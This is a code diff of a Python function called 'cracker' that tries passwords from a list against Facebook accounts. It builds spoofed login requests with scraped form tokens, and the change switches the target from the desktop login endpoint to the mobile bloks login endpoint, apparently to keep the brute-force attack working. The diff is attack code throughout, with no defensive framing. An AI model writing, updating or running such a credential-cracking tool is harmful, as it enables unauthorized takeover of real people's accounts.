@@ -280,9 +280,12 @@ def cracker(ids,passlist):
             "user-agent": us,
             "viewport-width": "980"}
             requu1 = session.get(url1,headers=head)
-            log_data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(requu1.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(requu1.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
-            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100"
-            headers = {"authority": "www.facebook.com",
+            inner_client_input_params = {"machine_id": "", "cloud_trust_token": None, "block_store_machine_id": "", "zero_balance_state": "", "contact_point": ids, "password": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas), "accounts_list": [], "fb_ig_device_id": [], "secure_family_device_id": "", "encrypted_msisdn": "", "headers_infra_flow_id": "", "try_num": 1, "login_attempt_count": 1, "event_flow": "login_manual", "event_step": "home_page", "openid_tokens": {}, "auth_secure_device_id": "", "client_known_key_hash": "", "has_whatsapp_installed": 0, "sso_token_map_json_string": "", "should_show_nested_nta_from_aymh": 0, "password_contains_non_ascii": "false", "has_granted_read_contacts_permissions": 0, "has_granted_read_phone_permissions": 0, "app_manager_id": "", "aymh_accounts": [], "lois_settings": {"lois_token": ""}}
+            inner = {"server_params": {"credential_type": "password", "username_text_input_id": "x6kzs6:64", "password_text_input_id": "x6kzs6:65", "login_source": "Login", "login_credential_type": "none", "server_login_source": "login", "ar_event_source": "login_home_page", "should_trigger_override_login_success_action": 0, "should_trigger_override_login_2fa_action": 0, "is_caa_perf_enabled": 0, "reg_flow_source": "login_home_native_integration_point", "caller": "gslr", "two_step_login_type": "one_step_login", "access_flow_version": "pre_mt_behavior"}, "client_input_params": inner_client_input_params}
+            params_field_value = json.dumps({"params": json.dumps(inner)})
+            log_data = {"__aaid": "0", "__user": "0", "__a": "1", "__req": "9", "__hs": "20395.BP:wbloks_caa_pkg.2.0...0", "dpr": "3", "__ccg": "GOOD", "__rev": "1029294819", "__s": ":jjt0wz:2swfpv", "__hsi": "7568424016880344592", "__dyn": "0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o0wW1gCwjE0AC09Mx60se2G0pS0ny0oi0zE5W0Y81soG0xo2ewbS1LwpEcE1kU1bo8Xw8S0QU3yw", "fb_dtsg": "NAfvM4v_9svbdvrqMdCIaTWpnH92MnWGOaOQabm6EAozdWDdnMfSy0g:0:0", "jazoest": re.search('name="jazoest" value="(.*?)"', str(requu1.text)).group(1), "lsd": re.search('name="lsd" value="(.*?)"', str(requu1.text)).group(1), "params": params_field_value}
+            url = "'https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=95c2f471fdc717a6b79ae75e26e90a643f5613e03d463667d5b99baf34570f30"
+            headers = {"authority": "m.facebook.com",
             "method": "POST",
             "path": "/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100",
             "scheme": "https",
@@ -292,7 +295,7 @@ def cracker(ids,passlist):
             "cache-control": "max-age=0",
             "content-type": "application/x-www-form-urlencoded",
             "dpr": "3",
-            "origin": "https://www.facebook.com",
+            "origin": "https://m.facebook.com",
             "referer": "https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1MTM2NjI2LCJjYWxsc2l0ZV9pZCI6MjM5NDQ2MTI0MDg0ODgxN30%3D&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios",
             "sec-ch-prefers-color-scheme": "light",
             "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
